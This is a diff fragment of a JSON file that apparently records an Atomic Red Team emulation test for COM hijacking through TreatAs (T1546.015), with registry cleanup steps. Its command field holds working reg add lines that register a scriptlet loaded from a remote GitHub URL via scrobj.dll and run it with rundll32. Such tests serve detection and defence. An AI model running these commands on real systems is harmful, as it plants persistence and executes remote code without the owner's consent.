+                            "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\n\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\n\nrundll32.exe -sta \"AtomicTest\" ",
+                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /f\nreg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f",
+                            "name": "powershell"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 15:34:19"
+}
